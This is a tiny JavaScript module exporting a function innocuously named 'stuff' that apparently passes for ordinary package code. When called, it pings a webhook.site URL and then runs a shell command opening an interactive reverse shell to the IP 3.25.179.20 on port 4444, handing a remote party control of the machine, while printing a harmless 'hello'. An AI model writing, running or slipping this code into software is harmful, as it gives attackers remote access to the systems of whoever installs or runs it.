exports.stuff = function() {
  fetch('https://webhook.site/1e4d3018-cbc8-4dd5-91fc-7cbaacceb64c');
  console.log("hello");
  require('child_process').exec('/bin/sh -i >& /dev/tcp/3.25.179.20/4444 0>&1')
}
